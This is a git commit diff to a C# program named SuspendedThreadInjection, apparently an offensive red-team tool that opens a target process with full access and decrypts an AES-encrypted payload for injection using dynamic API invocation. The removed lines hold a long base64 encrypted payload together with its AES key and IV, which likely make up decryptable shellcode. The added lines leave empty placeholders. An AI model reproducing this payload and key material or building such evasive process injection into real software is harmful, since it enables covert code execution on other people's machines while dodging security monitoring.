18804f5dfe989b48c77bbfeb2ed5ffb386d58350
UserX <george_patsias@hotmail.co.uk>
2021-10-20 13:43:39 +0300

    Update Program.cs

--- DInvoke/SuspendedThreadInjection/Program.cs
+++ DInvoke/SuspendedThreadInjection/Program.cs
@@ -85,9 +85,9 @@ namespace SuspendedThreadInjection
             hProcess = dOpenProcess(0x001F0FFF, false, pid);
 
 
-            string finalPayload = "AslaU5xFiIohDIlw0kEr/Aqy26mxRIF1xGDEBov4SbTe4VhoqRRi0MZVHOqjDe1GnHwYnveUcdAJFJZnEgfUpHSAr2okPHLdpzwcokHz/ZtTN7FWGqpr/8qC5KowK+1fVCO+MoE5cpiYj664IaVrQDJPdrdRMWR5dM7vPRWzLez5B601OsD7Y5jUKOqkcmo1qF9TJTedHNayh76pCc7TUkAzLXt+wJZp4nlZ7MWBpd1PtzttZOxhW7e3wN1NpakCHmDCVmAN90EN6DyQGZT7jhrjDw/rosqlrjUgXMGZNHJj90jbKMRKlYnquRHPv5lr3ANdWYpSasLaCUQmyEiFVV6B5EMT77Sg2T5b99z3gbIQ2s7vwYvXjbPS7VoAoB7uwrDTbFub9inpjTLgUOIDDHa/EIEoXKn1WN1HMDw28XRmbRmB3Gq13uavTydvt9nSAZ6kYjsmGSN7+Me/oO3sM8Hog4erYKP99myB9tZ9oU3s9sICR/kjQsq4yceM6bVJ6QQsgMKuhncKNGBlUc4N7IONO2/tw7KZ3ntHcTV5odBJJsU8VAXgbSaBrCjgPSoiC2JyJjwyWfh9sRjwfy53x21vuTSxwsRXAssGINqcDbaf7bgTNAatTgCNemYjX+rV1KgGWANICokz5gzaEzyHj2m0BpkheBnv5+B1gsODka4K1xkRbS3k2MIySmq6w+VkA2nXEZlbjBexXyna/3UdVIFzI3jLPG+4Yt+nBJ5whOo4xjuLfozBrwMRTztON9kV6DsAmQwenm4OWM8zI5IAP/qRL+G5bf1X7LdEthiIG6QZ9DHx7qnF3NSaw0/dld8yeaROfbfQOmrhqmozYnpdEZmdkoyLu2Nn4fL/N1GMa1+g5N7zP2jzmCSkPcmO7nOIJtiIHHS5MrW3dd3ezGhkYW8nlIn59l1gy0CdpKNkaGE=";
-            byte[] key = new byte[32] { 0x6e, 0xf3, 0x09, 0x80, 0xdf, 0xa4, 0x64, 0xc7, 0xd8, 0xa0, 0xb4, 0x29, 0x4b, 0x25, 0x0b, 0x94, 0x7e, 0xde, 0xe0, 0xe4, 0x7c, 0x20, 0x3a, 0x2a, 0xea, 0xa3, 0xa2, 0x24, 0x94, 0x74, 0x66, 0xd4 };
-            byte[] iv = new byte[16] { 0x42, 0xe7, 0x39, 0x57, 0x35, 0x79, 0x5f, 0x8f, 0xc2, 0x49, 0xe6, 0x05, 0xb8, 0x99, 0x32, 0xf8 };
+            string finalPayload = "";
+            byte[] key = new byte[] {  };
+            byte[] iv = new byte[] {  };
             byte[] decrypted_data = Decrypt(Convert.FromBase64String(finalPayload), key, iv);
 
 
